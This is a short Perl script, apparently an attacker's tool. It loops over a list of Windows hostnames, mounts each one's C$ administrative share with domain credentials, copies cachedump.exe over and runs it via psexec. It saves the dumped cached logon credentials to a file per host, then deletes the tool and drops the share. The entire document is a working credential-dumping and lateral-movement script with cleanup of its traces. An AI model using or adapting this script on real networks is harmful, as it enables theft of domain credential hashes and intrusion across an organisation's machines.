while (<>)
{
	$line=$_;
	chomp($line);
	$host="\\\\".$line;
	$command="net use w: $host\\c\$ \/u:DOMAIN\\USERNAME \"PASSWORD\"";
	print("$command");
	$result=`$command`;
  chomp($result); print("$result\n");
	if (index($result,"ully")>0)
	{
		$result=`copy cachedump.exe w:\\`;
		chomp($result); print("$result\n");
		
    $result=`psexec.exe $host c:\\cachedump.exe`;
		chomp($result); print("$result\n");
    open(HAND, ">$line.cache");
    print HAND $result;
    close(HAND);

    $result=`del w:\\cachedump.exe`;
		chomp($result); print("$result\n");
		
    $result=`net use w: \/d`;
		chomp($result); print("$result\n");
	} else {
		print("No c\$ session with: $host\n");
	}
}
